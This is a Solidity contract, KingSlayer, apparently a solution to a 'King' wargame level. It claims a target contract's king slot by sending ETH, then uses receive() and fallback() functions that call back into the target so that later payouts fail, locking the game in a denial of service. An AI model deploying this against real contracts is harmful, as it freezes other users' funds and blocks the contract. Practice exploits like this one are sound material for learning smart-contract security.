// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.7;

error KingSlayer__OnlyOwner();
error KingSlayer__CallFail();

contract KingSlayer {
    address owner;
    address king;

    constructor(address _kingAddress) {
        owner = msg.sender;
        king = _kingAddress;
    }

    function attack() public payable {
        if (!(msg.sender == owner)) revert KingSlayer__OnlyOwner();
        (bool success, ) = payable(king).call{value: msg.value}("");
        if (!success) revert KingSlayer__CallFail();
    }

    receive() external payable {
        (bool success, ) = payable(king).call{value: 0.001 ether}("");
    }

    fallback() external payable {
        (bool success, ) = payable(king).call{value: 0.001 ether}("");
    }
}